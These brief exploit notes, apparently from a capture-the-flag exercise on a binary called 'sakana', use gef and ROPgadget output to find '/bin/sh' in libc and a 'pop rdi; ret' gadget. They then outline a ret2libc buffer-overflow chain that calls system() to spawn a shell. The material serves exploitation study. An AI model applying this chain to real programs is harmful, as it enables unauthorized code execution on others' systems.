## Some Notes
1. There is the string "/bin/sh" in memory address 0x7f31bc4c55bd.
```
[+] Searching '/bin/sh' in memory
[+] In '/usr/lib/x86_64-linux-gnu/libc-2.31.so'(0x7f31bc4ab000-0x7f31bc4f9000), permission=r--
  0x7f31bc4c55bd - 0x7f31bc4c55c4  →   "/bin/sh" 
gef➤  x/bs 0x7f31bc4c55bd
0x7f31bc4c55bd: "/bin/sh"
```
2. There is a ROP gadget at 0x00000000000023a3
```
❯ ROPgadget --binary sakana --only 'pop|ret' | grep 'rdi'
0x00000000000023a3 : pop rdi ; ret
```
3. Overflow the buffer to cover the original return address ($rbp+8) with 0x00000000000023a3
4. Overflow the buffer to put the address of "bin/sh" in ($rbp+16)
5. Overflow the buffer to put the address of system() (0x52290)
6. leave; ret (pop rip)
7. rip will point to the address of the ROP gadget
